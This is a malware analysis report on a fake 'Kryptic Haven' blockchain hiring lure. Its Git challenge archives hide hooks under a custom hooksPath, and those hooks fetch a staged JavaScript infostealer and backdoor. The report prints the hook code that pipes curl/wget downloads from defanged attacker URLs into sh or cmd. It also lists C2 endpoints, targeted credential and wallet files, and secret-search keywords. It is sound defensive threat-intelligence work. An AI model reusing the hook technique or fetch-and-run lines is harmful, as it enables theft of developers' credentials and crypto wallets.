---
title: "Kryptic Haven-Branded Git Challenge: Malicious Hooks Deliver Gurucooldown Payload Chain and Multi-Module JavaScript Backdoor"
date: 2026-05-17
author: "ThreatProphet"
description: "Analysis of a Kryptic Haven-branded LinkedIn hiring lure that delivered weaponized Git challenge archives with local hooks, Short.io-staged payloads, and a multi-module JavaScript backdoor targeting browsers, wallets, files, clipboard contents, and remote command execution."
tags:
  - dprk-linked
  - void-dokkaebi-overlap
  - contagious-interview
  - fake-developer-recruitment
  - git-hooks
  - javascript
  - node-js
  - wallet-theft
  - infostealer
  - backdoor
  - linkedin-lure
  - short-io
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.002
  - T1566.003
  - T1204.002
  - T1059.003
  - T1059.004
  - T1059.006
  - T1059.007
  - T1027
  - T1140
  - T1105
  - T1071.001
  - T1082
  - T1083
  - T1005
  - T1033
  - T1115
  - T1552.001
  - T1555.003
  - T1041
report_id: "TP-2026-013"
showToc: true
---

> *"They called it a haven; the rebase was the altar, and the hook was the knife."*

## Executive Summary

This report analyzes a **Kryptic Haven-branded** recruitment lure that began with a LinkedIn message from a recruiter persona named **Tatiana Zadorozhnia**. The report treats Kryptic Haven as lure branding and low-assurance recruitment infrastructure; it does not establish whether any legitimate company, brand owner, or third-party profile was actor-created, compromised, impersonated, or otherwise misused. The message directed the target to a 24-hour hiring-process link at:

```text
hxxps://kryptic-haven[.]com/hiring/1778849135
```

The site presented itself as a `Blockchain Company Hiring Form`. It collected applicant contact details, work preferences, proof links, and then offered a `Git challenge`. The visible challenge topics included Solidity, Golang, Rust, Java, and Tailwind. The instructions asked the applicant to rebase or merge a development branch to master, push the result to the applicant's own Git repository, and submit the repository URL.

The challenge archives were not benign coding exercises. Static analysis showed that all five bundled local Git repositories configured a custom hook directory:

```ini
[core]
	hooksPath = .git/objects/interrupt/
```

This redirects Git away from the normal `.git/hooks/` sample-hook directory and into an attacker-controlled path that resembles internal Git object storage. The derived archive review confirmed executable active hooks for `pre-commit`, `post-checkout`, `pre-merge-commit`, `pre-push`, and `pre-rebase` across the challenge archives. The hook design aligned directly with the lure instructions: normal Git actions required by the challenge would trigger attacker-controlled shell or command-script execution.

The downloader hooks reached `gurucooldown.short[.]gy` through platform-specific Short.io URLs, then redirected to `165.140.86[.]190:3000` with token `6df937fe9011`. A corrected chained capture recovered the payload sequence through stage 4. The final recovered JavaScript framework contains four embedded modules:

| Module | Role |
|---|---|
| `embedded_g.js` | Browser profile, credential-store, wallet-extension, Solana identity, and macOS keychain collection |
| `embedded_n.js` | Host profiling, Socket.IO and TCP command-and-control, file manager, shell command execution, search, upload, and browser process control |
| `embedded_l.js` | Clipboard monitoring and changed-content upload |
| `embedded_p.js` | Secondary Python module retrieval and launcher logic |

The technical chain from hiring lure to challenge archive, malicious Git hooks, Short.io redirects, staged Node.js loader, and stage-4 JavaScript backdoor is assessed with **high confidence**. Campaign overlap with public Void Dokkaebi / Famous Chollima reporting is assessed with **medium confidence** because public reporting lists `gurucooldown.short[.]gy` in the same fake-job-interview repository-abuse context. Attribution to DPRK-linked activity remains **low-to-medium confidence**: the tradecraft and infrastructure overlap are notable, but this investigation does not contain a single artifact sufficient for definitive state attribution.

## Evidence Basis and Scope

This report is based on preserved screenshots, passive domain and infrastructure enrichment, static extraction of five challenge archives, static Git metadata and hook review, controlled inert capture of staged payloads, static deobfuscation of the stage-3 loader, and static deobfuscation of the stage-4 JavaScript payload.

No challenge repository, Git hook, shell script, command script, Node.js payload, package installation, Python module, or decoded stage-4 component was executed during analysis.

The evidence archive is not distributed with this public report. Public comparison material is provided through defanged indicators, hashes, artifact names, command patterns, C2 endpoints, recovered strings, and behavioral descriptions. Raw malware samples, local filesystem paths, private pivots, and credentials are intentionally excluded.

**Brand-use notice:** references to Kryptic Haven describe observed lure branding, domain material, and recruiter persona context. They should not be read as proof that a legitimate brand owner or real individual knowingly participated in the activity. Domain and profile-control status remain unresolved.

Claims in this report are separated into three categories:

- **Directly observed:** present in screenshots, challenge archives, captured payload bodies, recovered scripts, decoded payloads, hashes, or preserved HTTP metadata.
- **Behavioral assessment:** inferred from static analysis of recovered code and decoded payload logic.
- **External/campaign context:** based on overlap with prior public reporting and previous ThreatProphet fake developer recruitment cases, but not used alone to prove attribution.

## Key Findings

| Finding | Assessment |
|---|---|
| Initial access vector | LinkedIn recruitment message with time-limited hiring URL |
| Recruiter persona | `Tatiana Zadorozhnia` |
| Lure domain | `kryptic-haven[.]com` |
| Brand/domain status | Recent, low-assurance public footprint; ownership/control unresolved |
| Observed lure URL | `hxxps://kryptic-haven[.]com/hiring/1778849135` |
| Lure theme | Blockchain company hiring form and Git challenge |
| Challenge topics | Solidity, Golang, Rust, Java, Tailwind |
| Execution trigger | Local Git hooks during checkout, commit, merge, rebase, and push |
| Git hook path | `.git/objects/interrupt/` via local `core.hooksPath` |
| Active hook validation | Executable `pre-commit`, `post-checkout`, `pre-push`, `pre-rebase`, and `pre-merge-commit` hooks observed across archives |
| Short-link infrastructure | `gurucooldown.short[.]gy` |
| First payload server | `165.140.86[.]190:3000` |
| Campaign token | `6df937fe9011` |
| Stage-3 config endpoint | `45.59.163[.]198:1244` |
| Stage-4 HTTP endpoint | `45.59.160[.]200:1244` |
| Stage-4 Socket.IO endpoint | `165.140.86[.]183:2246` |
| Stage-4 TCP endpoint | `165.140.86[.]183:1247` |
| Runtime marker | `knHbMe8` |
| Final payload role | Multi-module JavaScript infostealer/backdoor with Python module dropper |
| Attribution | Low-to-medium confidence DPRK-linked / Void Dokkaebi consistency, not definitive |

---

## Attack Overview

### Initial Contact

The first preserved evidence is a LinkedIn message from `Tatiana Zadorozhnia`. The message provided a hiring-process URL and stated that the link would be valid for 24 hours:

```text
hxxps://kryptic-haven[.]com/hiring/1778849135
```

The site branded itself as **Kryptic Haven** and described the workflow as a blockchain company hiring form. The form requested identity and contact details, work-type preferences, a LinkedIn profile, expected monthly budget, team-leadership capacity, crypto-card familiarity, top skill, and proof links.

The final stage of the form presented a Git challenge. The observed topics were:

```text
Solidity
Golang
Rust
Java
Tailwind
```

The instructions asked the applicant to rebase or merge a development branch into master, push the result to the applicant's own Git repository, and submit the repository URL. This is important because the delivered challenge archives contained Git hooks that would execute during exactly those developer actions.

### Lure Domain Context

`kryptic-haven[.]com` was registered through Hostinger on `2026-03-13`, two months before the preserved May 15 lure screenshots. DNS observations placed the web host at `145.223.107[.]191` with an IPv6 record of `2a02:4780:b:727:0:1162:4ae6:2`. The domain used Hostinger parking nameservers and Hostinger mail configuration. DMARC was present but configured with a monitoring-only policy:

```text
v=DMARC1; p=none
```

Certificate transparency showed Let's Encrypt certificates issued on `2026-03-13` and `2026-05-12`. A public urlscan result saw the apex domain on `2026-03-17`, when the domain was four days old.

Search results showed multiple LinkedIn profiles claiming association with `Kryptic Haven`, including the recruiter name observed in local screenshots. These profiles are useful OSINT leads, but they do not prove whether the brand, domain, or identities were actor-created, compromised, impersonated, or otherwise misused. The safest report language is therefore **Kryptic Haven-branded lure** or **Kryptic Haven-branded recruitment infrastructure**, not validated company attribution.

### Challenge Archive Delivery

Five challenge archives were preserved:

| Challenge | SHA-256 |
|---|---|
| `solidity_challenge.tar.gz` | `271fa4e8d30fb269872ec78ac0f7b9363e72f7cc51f2b02d31853b49d1646ff9` |
| `golang_challenge.tar.gz` | `9b1a62003318ef7fd42872a9dce784e451b778c76ce22dcdf88577ec4d781ff4` |
| `rust_challenge.tar.gz` | `b46b9779c4d197cef1b4490f2cb6bff589ca08a352ed4a839c591ab3c6bc0406` |
| `java_challenge.tar.gz` | `d9b95da56b4ba32b4dd26edc584f0da054579b950a4e0d2dd288fc02ac590183` |
| `tailwind_challenge.tar.gz` | `410a9e5f16440a939312ee2e9e522943f16a777e191f9f8626cbda6ec5590c77` |

Each archive contained a Git repository with a custom hooks path:

```ini
[core]
	hooksPath = .git/objects/interrupt/
```

The active hook names were:

```text
pre-commit
post-checkout
pre-merge-commit
pre-push
pre-rebase
```

Derived archive review confirmed those hooks were stored under `.git/objects/interrupt/` with executable mode `755`. The ordinary `.git/hooks/` directory contained normal `.sample` hook templates, while the active malicious hooks were controlled by the `core.hooksPath` override. This distinction matters for hunting: defenders should not inspect only `.git/hooks/`; they should also query `git config --local --get core.hooksPath`.

This is a significant delivery choice. Git hooks are local client-side files and are not normally transferred through a standard remote clone, but they are preserved when a full repository directory is delivered as an archive. The actor paired the hook delivery mechanism with challenge instructions that naturally cause the applicant to run Git operations.

### Kill Chain

```text
LinkedIn recruiter message
  -> hxxps://kryptic-haven[.]com/hiring/1778849135
  -> blockchain hiring form and Git challenge selection
  -> applicant receives one of five challenge archives
  -> archive includes Git repository with core.hooksPath=.git/objects/interrupt/
  -> checkout, commit, merge, rebase, or push triggers malicious local hook
  -> hook requests platform-specific gurucooldown.short[.]gy URL
  -> Short.io redirects to 165.140.86[.]190:3000 with token 6df937fe9011
  -> stage 1 shell or command script downloads stage 2
  -> stage 2 ensures Node.js, downloads parser and package manifest, runs npm install
  -> stage 3 parser retrieves config from 45.59.163[.]198:1244
  -> config decodes to 45.59.160[.]200 and runtime marker knHbMe8
  -> stage 3 writes $HOME/.vscode/f.js and package.json, installs dependencies, launches Node
  -> stage 4 inflates and runs four embedded JavaScript modules
  -> final modules provide browser/wallet theft, clipboard monitoring, file exfiltration, remote shell/file manager, and Python module dropping
```

---

## Technical Analysis

### Stage 0: Git Hooks Hidden in Challenge Archives

The malicious execution mechanism is not in a package manifest, VS Code task file, or visible application entry point. It is hidden in local Git configuration and hook files. Each extracted challenge repository sets `core.hooksPath` to `.git/objects/interrupt/`, moving active hooks out of the normal `.git/hooks/` directory and into a path that visually resembles internal Git object storage. This makes the delivery materially different from normal source-code review: the project appears to be a coding challenge, while execution is delegated to Git client behavior.

The `pre-commit` and `post-checkout` hooks were identical across all five archives. They selected a platform-specific Short.io URL using `$OSTYPE`:

```sh
case "$OSTYPE" in
  darwin*)  curl -s 'hxxps://gurucooldown.short[.]gy/knHbMe8m' -L | sh  > /dev/null 2>&1 &;;
  linux*)   wget -qO- 'hxxps://gurucooldown.short[.]gy/knHbMe8l' -L | sh  > /dev/null 2>&1 &;;
  msys*)    curl -s hxxps://gurucooldown.short[.]gy/knHbMe8w -L | cmd  > /dev/null 2>&1 &;;
  cygwin*)  curl -s hxxps://gurucooldown.short[.]gy/knHbMe8w -L | cmd  > /dev/null 2>&1 &;;
  *)        curl -s 'hxxps://gurucooldown.short[.]gy/knHbMe8m' -L | sh  > /dev/null 2>&1 &;;
esac
```

The `pre-push`, `pre-rebase`, and `pre-merge-commit` hooks were wrappers that invoked the downloader hook:

```sh
./.git/objects/interrupt/pre-commit
```

Two unique malicious hook hashes were observed:

| SHA-256 | Role |
|---|---|
| `802df7a0820ddb4612d05c79ca260cdc34cc0300f7176bb08f602d24d86d3a46` | `pre-commit` and `post-checkout` downloader |
| `bb811bcb3bebacd32b1fa103aa562054dfe3786283dd2c43ee8bf83e316060a0` | `pre-push`, `pre-rebase`, and `pre-merge-commit` wrapper |

Static review found no `.vscode/tasks.json`, no challenge-level `package.json`, no Windows batch files, and no symlinks in the extracted challenge archives. Those negative findings do not reduce the malicious verdict because Git hooks are the execution mechanism.

The local Git configuration also contained low-confidence identity metadata. Some archives included `contact@kryptic-haven[.]com`; others included `challenge@gmail[.]com`. These values are useful as artifact pivots and lure-context markers, but they should not be treated as verified real-world identity or attribution evidence.

### Stage 1: Short.io Redirects and Platform Droppers

The malicious hooks referenced three platform-specific short URLs:

| Platform | Short.io URL | Redirect Target |
|---|---|---|
| macOS | `hxxps://gurucooldown.short[.]gy/knHbMe8m` | `hxxp://165.140.86[.]190:3000/task/mac?token=6df937fe9011` |
| Linux | `hxxps://gurucooldown.short[.]gy/knHbMe8l` | `hxxp://165.140.86[.]190:3000/task/linux?token=6df937fe9011` |
| Windows | `hxxps://gurucooldown.short[.]gy/knHbMe8w` | `hxxp://165.140.86[.]190:3000/task/windows?token=6df937fe9011` |

The shortener returned HTTP 301 through Short.io edge infrastructure. The captured stage-1 scripts were platform-aware:

| Platform URL | SHA-256 | Behavior |
|---|---|---|
| `knHbMe8m` | `0502450915949fa99bdafa58b49f8b0e9e3a0c355076ccb140374e4d60b7bcf4` | Creates `$HOME/.task`, downloads `tokenlinux.sh`, marks it executable, launches with `nohup bash`, clears terminal |
| `knHbMe8l` | `2d0bf7c783f4593c7f68b7a72ed339b274dcabe8fc9b8e09e8765d9ad2f91f69` | Uses `$HOME/Documents`, downloads `tokenlinux.npl`, renames to `tokenlinux.sh`, marks executable, launches with `nohup bash`, clears terminal |
| `knHbMe8w` | `2fbbfe4d90f252142017e25d833e995c27f1083b17bfee96554694fffb7d4083` | Deletes prior `%USERPROFILE%\parse` and `%USERPROFILE%\token.cmd`, downloads `token.cmd`, executes it |

Each stage-1 script embedded a signed JWT-like `st` parameter. Decoded claims included:

```text
origToken: 6df937fe9011
step: 1
ip: ::ffff:89.249.72.12
```

The sessions were short-lived, with observed expiration roughly three minutes after issue. This token behavior likely limited retrospective retrieval and frustrated delayed analysis.

### Stage 2: Node.js Bootstrap

The corrected chained capture retrieved stage 2 before the short-lived tokens expired.

| Platform | Stage-2 SHA-256 |
|---|---|
| Linux | `ac48388fec376f464f28c947b2471ee1cab7d9df76b735c2720f9a9a81fd5e9b` |
| macOS | `76f9ce0154244eb635ab611777e8323ed1a5f7eff434494a0549fff2fd1d1517` |
| Windows | `36db9583b65ab3b5bc8f935d682b2d7879bad510ad2cb1c360dc652447c022a7` |

The macOS and Linux stage-2 scripts:

- Ensured Node.js `20.11.1` was available, downloading from legitimate `nodejs.org` infrastructure if needed.
- Used `$HOME/.task` as a working directory.
- Downloaded `parser.js` from `165.140.86[.]190:3000/task/parser`.
- Downloaded `package.json` from `165.140.86[.]190:3000/task/package.json`.
- Ran `npm install`.
- Launched the parser with `nohup node`.

The Windows branch restarted itself hidden with PowerShell, obtained a Node.js runtime if needed, downloaded `parser.npl` and `package.json` into `%USERPROFILE%\.task`, ran `npm install axios`, and launched the parser with Node.

### Stage 3: Obfuscated JavaScript Loader

The stage-3 parser was identical across the macOS, Linux, and Windows branches:

```text
783386f4fcc6241e26e00edde18e0e7c1bee218149d92217909d133d7d01ba5a  parser JavaScript
c31cf2a5bd207724a9a8e7a3b2116c17fe620f8bfdfa3cd7fef2641ec92210f9  package.json
```

Static deobfuscation recovered use of:

```text
os
fs
request
path
node:process
child_process
```

Recovered strings showed filesystem placement, dependency installation, payload retrieval, and execution logic:

```text
.vscode
f.js
/s/
/f/
/p
/keys
package.json
cd
&& npm i --silent
node_modules
npm --prefix
nohup
```

The parser carried token `6df937fe9011` and contacted:

```text
hxxp://45.59.163[.]198:1244/s/6df937fe9011
```

The preserved response body was:

```text
ZT3NDUuNTkuMTYwLjIwMCxrbkhiTWU4
```

Static decoding produced:

```text
45.59.160.200,knHbMe8
```

The parser then constructed:

```text
hxxp://45.59.160[.]200:1244/f/knHbMe8
hxxp://45.59.160[.]200:1244/p
hxxp://45.59.160[.]200:1244/keys
```

It created a working directory under the user's home directory:

```text
$HOME/.vscode
```

It wrote:

```text
$HOME/.vscode/f.js
$HOME/.vscode/package.json
```

It installed dependencies and launched `f.js` under Node. On Windows it used `child_process.spawn(process.execPath, ["f.js"], ...)` with `windowsHide: true`. On macOS and Linux it launched through `nohup` with detached and ignored standard IO. The loader also scheduled retries roughly every 10 minutes and 16 seconds, allowing up to three retries after the first run.

**Persistence and re-execution assessment:** current evidence supports repository-resident re-execution, staged-file survivability, retry logic, and background/runtime execution rather than durable OS boot persistence. The challenge archive can re-trigger the chain whenever the user performs the Git operations required by the task. Stage-1 and stage-2 scripts launch background processes with `nohup` or hidden Windows process behavior, stage 3 writes `f.js` and `package.json` under `$HOME/.vscode`, and decoded stage-3/stage-4 artifacts contain retry and runtime-process markers. Current evidence does not show cron, systemd units, LaunchAgents, registry Run keys, scheduled tasks, startup-folder writes, shell-profile modification, or service installation.

### Stage 4: Multi-Module JavaScript Backdoor

The stage-4 artifacts were:

```text
36751cf39a475d1f1c76631d6e10a0f8ae5dbdec606a38c437a9d4ea6754bcf2  f_knHbMe8.body
f126179d8644770b89f7299956483e0af7b87d28a8ef5d395aa34bbffc088d9f  package_p.body
```

The marker inventory confirms `knHbMe8` propagation across chained stage captures, gzip/Base64 embedded modules in the stage-4 material, clipboard-upload markers in the stage-4 body/package material, and Python-dropper markers in the stage-4 body. A separate `ftp_claim_check` marker appears in package-related artifacts and remains a follow-up context item unless bounded code review shows concrete FTP credentials or FTP client upload logic.

The outer `f.js` wrapper contained four gzip-compressed, Base64-encoded JavaScript blobs under keys `g`, `n`, `l`, and `p`. It inflated each blob with `gunzipSync()` and launched the resulting JavaScript through a child Node process.

Recovered embedded script hashes:

| SHA-256 | Embedded Script | Role |
|---|---|---|
| `87b1df731ebfbdb8bdd6a75b5acf2d52b0f3a95b2bd324450a30a18934c0600f` | `embedded_g.js` | Browser and wallet collector |
| `b55b84974a5b8e1124efdfd04eade49bd23676db28274148d1bf23b44c6d2b12` | `embedded_n.js` | Remote shell, file manager, and exfiltration client |
| `c571e821d6f94eaf238bcc8c48dfaab36dd1dc5cbe59554a9263121c7479379b` | `embedded_l.js` | Clipboard monitor |
| `751e836e79e146be0e8fb5f7cda9b36984384e3ea7472bd8d16b1e56363a3810` | `embedded_p.js` | Python module dropper and runtime downloader |

#### `embedded_g.js`: Browser and Wallet Collector

`embedded_g.js` collects browser credential stores, browser extension storage, selected wallet files, Solana identity material, and macOS keychain files. It uploads collected material to:

```text
hxxp://45.59.160[.]200:1244/uploads
```

Recovered browser targets include:

```text
Brave
Chrome
Chromium
Microsoft Edge
Opera
LT Browser
```

Recovered targeted files and directories include:

```text
Login Data
Web Data
Local Extension Settings
~/.config/solana/id.json
~/Library/Keychains/login.keychain-db
```

Recovered extension IDs include known wallet extension targets, including:

```text
nkbihfbeogaeaoehlefnkodbefgpgknn
ejbalbakoplchlghecdalmeeeajnimhm
ibnejdfjmmkpcnlpebklmnkoeoihofec
bfnaelmomeimhlpmgjnjophhpkkoljpa
fhbohimaelbohpjbbldcngcnapndodjp
hnfanknocfeofbddgcijnmhnfnkdnaad
```

The collector enumerates browser profiles named `Default` and `Profile N`, copies locked files through a temporary upload directory when direct reads fail, and posts multipart form data with timestamp, payload type `knHbMe8`, host identifier, and file metadata.

#### `embedded_n.js`: Remote Shell, File Manager, and Exfiltration Client

`embedded_n.js` provides host profiling, command-and-control, file browsing, shell command execution, search, upload, and browser process control.

Recovered endpoints:

```text
hxxp://45.59.160[.]200:1244/keys
hxxp://165.140.86[.]183:2246
165.140.86[.]183:1247
hxxp://ip-api[.]com/json
```

The client posts system and geolocation-enriched host metadata to `/keys`, queries `ip-api[.]com` for public IP context, connects to Socket.IO at `165.140.86[.]183:2246`, and opens a separate TCP client to `165.140.86[.]183:1247`.

Recovered host fields include:

```text
uuid
system
release
version
homedir
hostname
username
regionName
country
city
isp
zip
lon
lat
timezone
```

Recovered command handlers include:

```text
ssh_ses
ssh_obj
ssh_cmd
ssh_upload
ssh_kill
ssh_env
ssh_mmc
ssh_dnf
ssb_dir
ssb_sdir
ssb_cmd
ssb_find
ssb_view
ssb_upload
```

The decoded client can execute shell commands, change working directories, list drives and directories, read small files, write files, search for files, upload files and directories through attacker-controlled transfer paths, and kill browser processes.

Recovered search keywords and extensions include:

```text
.env
config.js
secret
metamask
wallet
private
mnemonic
password
account
seed
solana
.xls
.xlsx
.doc
.docx
.rtf
.kbdx
.one
.onenote
.zip
.rar
.7z
.pdf
.vmdk
```

Default skip patterns include:

```text
node_modules
.git
```

#### `embedded_l.js`: Clipboard Monitor

`embedded_l.js` polls clipboard contents and posts changed clipboard text to:

```text
hxxp://165.140.86[.]183:2246/cb
```

Recovered behavior:

- macOS invokes `pbpaste`.
- Windows invokes PowerShell `Get-Clipboard -Raw`.
- Poll interval is 1000 milliseconds.
- Changed content is debounced for 500 milliseconds before upload.
- Default maximum clipboard capture size is 10 MiB.

Posted fields include:

```text
group = knHbMe8
hid   = hostname; on macOS, hostname + "+" + username
text  = clipboard text
```

#### `embedded_p.js`: Python Module Dropper

`embedded_p.js` retrieves and launches a secondary Python module payload. On Windows it can also download and unpack a Python runtime archive before launching the module.

Recovered endpoints:

```text
hxxp://45.59.160[.]200:1244/clw/knHbMe8
hxxp://45.59.160[.]200:1244/clw1/knHbMe8
hxxp://45.59.163[.]50:1244/pdo
```

Recovered paths:

```text
$HOME/mod.py
$HOME/mod.so
$HOME/.mod
$HOME/.py2/py.exe
%TEMP%/p.zi
%TEMP%/p2.zip
```

Recovered launcher call:

```text
mod.start("knHbMe8", "91d710f299278fe1", "99571b8296478811", 1245)
```

Windows flow:

- Download `hxxp://45.59.160[.]200:1244/clw/knHbMe8`.
- Write the response to `$HOME/mod.py`.
- Write `$HOME/.mod` as a Python launcher.
- Execute `$HOME/.py2/py.exe .mod` with working directory `$HOME`.
- If the Python runtime is missing, download `hxxp://45.59.163[.]50:1244/pdo`, verify size growth, rename to `%TEMP%/p2.zip`, and extract it.

Non-Windows flow:

- Download `hxxp://45.59.160[.]200:1244/clw1/knHbMe8`.
- Write the response to `$HOME/mod.so`.
- Write `$HOME/.mod` as a Python launcher.
- Execute `nohup python3 .mod`.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access | LinkedIn message delivered the Kryptic Haven hiring URL |
| T1566.003 | Spearphishing via Service | Initial Access | Social and developer-platform workflow used as recruitment lure |
| T1204.002 | User Execution: Malicious File | Execution | Applicant must interact with delivered challenge archive and run Git workflow |
| T1059.003 | Windows Command Shell | Execution | Windows hook branch pipes payload to `cmd` and executes `token.cmd` |
| T1059.004 | Unix Shell | Execution | macOS/Linux hook branches pipe remote content to `sh`; stage scripts run Bash |
| T1059.006 | Python | Execution | Stage-4 dropper retrieves and launches Python module payload |
| T1059.007 | JavaScript | Execution | Stage-3 loader and stage-4 modules execute under Node.js |
| T1027 | Obfuscated Files or Information | Defense Evasion | Stage-3 parser is obfuscated; stage 4 stores gzip/Base64 JavaScript blobs |
| T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | Runtime inflates and executes embedded compressed JavaScript modules |
| T1105 | Ingress Tool Transfer | Command and Control | Multiple stages download scripts, parser, packages, and secondary modules; legitimate `nodejs.org` is used for runtime retrieval and should not be treated as actor infrastructure |
| T1071.001 | Web Protocols | Command and Control | HTTP, Socket.IO/WebSocket, and related web protocols are used for staging, host registration, uploads, clipboard upload, and module retrieval |
| T1082 | System Information Discovery | Discovery | Host OS, release, version, and runtime metadata collected |
| T1083 | File and Directory Discovery | Discovery | File manager and search functions enumerate directories and target files |
| T1005 | Data from Local System | Collection | Browser stores, wallet files, local documents, and sensitive files targeted |
| T1033 | System Owner/User Discovery | Discovery | Username and host identity are collected for registration |
| T1115 | Clipboard Data | Collection | Clipboard monitor reads changed clipboard contents and posts them to C2 |
| T1552.001 | Credentials In Files | Credential Access | Searches target secrets, private keys, seed material, and configuration files |
| T1555.003 | Credentials from Web Browsers | Credential Access | Browser `Login Data`, `Web Data`, and extension storage are targeted |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Collected files and clipboard contents are uploaded to actor-controlled endpoints |

---

## Infrastructure Analysis

### Lure Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `kryptic-haven[.]com` | Domain | Kryptic Haven-branded hiring form host |
| `www.kryptic-haven[.]com` | Domain | Alias to apex |
| `hxxps://kryptic-haven[.]com/hiring/1778849135` | URL | Observed hiring-process URL |
| `145.223.107[.]191` | IPv4 | Hostinger-hosted A record observed during investigation |
| `2a02:4780:b:727:0:1162:4ae6:2` | IPv6 | AAAA record observed during investigation |

The lure domain was registered through Hostinger, used Hostinger DNS and mail configuration, and had a recent public footprint. This supports treating the site as newly created or low-assurance recruitment infrastructure. It does not establish whether any legitimate brand owner knowingly participated in the activity.

### Payload and C2 Infrastructure

| Indicator | Role |
|---|---|
| `gurucooldown.short[.]gy` | Short.io delivery layer for platform-specific hook URLs |
| `165.140.86[.]190:3000` | First-stage payload server and stage-2 delivery |
| `45.59.163[.]198:1244` | Stage-3 configuration endpoint |
| `45.59.160[.]200:1244` | Stage-4 HTTP staging, host registration, upload, and Python module endpoints |
| `45.59.163[.]50:1244` | Python runtime archive endpoint |
| `165.140.86[.]183:2246` | Socket.IO C2 and clipboard endpoint |
| `165.140.86[.]183:1247` | TCP C2 endpoint |
| `ip-api[.]com` | Third-party geolocation lookup used by payload |

`165.140.86[.]190` was observed in a `NOVA` assignment ending at `.190`, with Tier.Net Technologies LLC as an upstream or registrant entity and AS14754 observed via Team Cymru. No reverse DNS was observed for that IP during collection. The other payload hosts should be treated as infrastructure indicators until separate RDAP, passive DNS, service-banner, or hosting-provider enrichment confirms allocation context.

Short.io, Hostinger, Node.js, and ip-api are legitimate service providers. Their presence should be interpreted as abuse or use of shared infrastructure, not as evidence that those providers knowingly participated.

---

## Indicators of Compromise

> All indicators are defanged for public reporting. Treat exact refanged values as high confidence unless the notes say otherwise.

### Network Indicators

| Indicator | Type | Role |
|---|---|---|
| `kryptic-haven[.]com` | Domain | Lure site / hiring form |
| `www.kryptic-haven[.]com` | Domain | Lure site alias |
| `hxxps://kryptic-haven[.]com/hiring/1778849135` | URL | Observed hiring URL |
| `145.223.107[.]191` | IPv4 | Lure-site host |
| `2a02:4780:b:727:0:1162:4ae6:2` | IPv6 | Lure-site host |
| `gurucooldown.short[.]gy` | Domain | Short-link payload delivery |
| `hxxps://gurucooldown.short[.]gy/knHbMe8m` | URL | macOS hook URL |
| `hxxps://gurucooldown.short[.]gy/knHbMe8l` | URL | Linux hook URL |
| `hxxps://gurucooldown.short[.]gy/knHbMe8w` | URL | Windows hook URL |
| `165.140.86[.]190` | IPv4 | Stage-1 and stage-2 payload server |
| `hxxp://165.140.86[.]190:3000/task/mac?token=6df937fe9011` | URL | macOS first-stage redirect target |
| `hxxp://165.140.86[.]190:3000/task/linux?token=6df937fe9011` | URL | Linux first-stage redirect target |
| `hxxp://165.140.86[.]190:3000/task/windows?token=6df937fe9011` | URL | Windows first-stage redirect target |
| `hxxp://165.140.86[.]190:3000/task/tokenlinux?token=6df937fe9011` | URL | macOS/Linux stage-2 script endpoint |
| `hxxp://165.140.86[.]190:3000/task/token?token=6df937fe9011` | URL | Windows stage-2 script endpoint |
| `hxxp://165.140.86[.]190:3000/task/parser` | URL | Stage-3 parser endpoint |
| `hxxp://165.140.86[.]190:3000/task/package.json` | URL | Stage-3 package endpoint |
| `45.59.163[.]198` | IPv4 | Stage-3 config host |
| `hxxp://45.59.163[.]198:1244/s/6df937fe9011` | URL | Stage-3 config endpoint |
| `45.59.160[.]200` | IPv4 | Stage-4 HTTP host |
| `hxxp://45.59.160[.]200:1244/keys` | URL | Host registration endpoint |
| `hxxp://45.59.160[.]200:1244/uploads` | URL | Browser/wallet upload endpoint |
| `hxxp://45.59.160[.]200:1244/f/knHbMe8` | URL | Stage-4 JavaScript endpoint |
| `hxxp://45.59.160[.]200:1244/p` | URL | Stage-4 package endpoint |
| `hxxp://45.59.160[.]200:1244/clw/knHbMe8` | URL | Windows Python module endpoint |
| `hxxp://45.59.160[.]200:1244/clw1/knHbMe8` | URL | Non-Windows Python module endpoint |
| `45.59.163[.]50` | IPv4 | Python runtime delivery host |
| `hxxp://45.59.163[.]50:1244/pdo` | URL | Python runtime archive endpoint |
| `165.140.86[.]183:2246` | Host/port | Socket.IO C2 |
| `165.140.86[.]183:1247` | Host/port | TCP C2 |
| `hxxp://165.140.86[.]183:2246/cb` | URL | Clipboard upload endpoint |
| `hxxp://ip-api[.]com/json` | URL | Third-party geolocation lookup used by payload |

### Tokens, Runtime Markers, and Filenames

| Indicator | Type | Notes |
|---|---|---|
| `6df937fe9011` | Token | Campaign/staging token |
| `knHbMe8` | Runtime marker | Stage-4 group/type marker |
| `tokendapp` | Package name | Stage-3 package name |
| `tokenlinux.sh` | Filename | macOS/Linux second-stage script |
| `token.cmd` | Filename | Windows second-stage script |
| `parser.js` | Filename | macOS/Linux stage-3 parser |
| `parser.npl` | Filename | Windows stage-3 parser |
| `node-v20.11.1-darwin-x64.tar.xz` | Filename | Node.js runtime artifact referenced by stage 2 |
| `node-v20.11.1-linux-x64.tar.xz` | Filename | Node.js runtime artifact referenced by stage 2 |

### Git Metadata and Hook Artifacts

| Indicator | Type | Notes |
|---|---|---|
| `core.hooksPath=.git/objects/interrupt/` | Git configuration | Custom hook path present across extracted challenge repositories |
| `.git/objects/interrupt/pre-commit` | Active hook | Downloader hook; same hash as `post-checkout` |
| `.git/objects/interrupt/post-checkout` | Active hook | Downloader hook; same hash as `pre-commit` |
| `.git/objects/interrupt/pre-push` | Active hook | Wrapper invoking `pre-commit`; same hash as `pre-rebase` and `pre-merge-commit` |
| `.git/objects/interrupt/pre-rebase` | Active hook | Wrapper invoking `pre-commit`; same hash as `pre-push` and `pre-merge-commit` |
| `.git/objects/interrupt/pre-merge-commit` | Active hook | Wrapper invoking `pre-commit`; same hash as `pre-push` and `pre-rebase` |
| `contact@kryptic-haven[.]com` | Git config email | Local archive metadata; artifact pivot only, not attribution proof |
| `challenge@gmail[.]com` | Git config email | Local archive metadata; artifact pivot only, not attribution proof |

### Host Artifacts

| Artifact | Notes |
|---|---|
| `$HOME/.task/tokenlinux.sh` | macOS stage-1/stage-2 script path |
| `$HOME/Documents/tokenlinux.sh` | Linux stage-1/stage-2 script path |
| `%USERPROFILE%\token.cmd` | Windows stage-1/stage-2 command script path |
| `%USERPROFILE%\.task\parser.npl` | Windows stage-3 parser path |
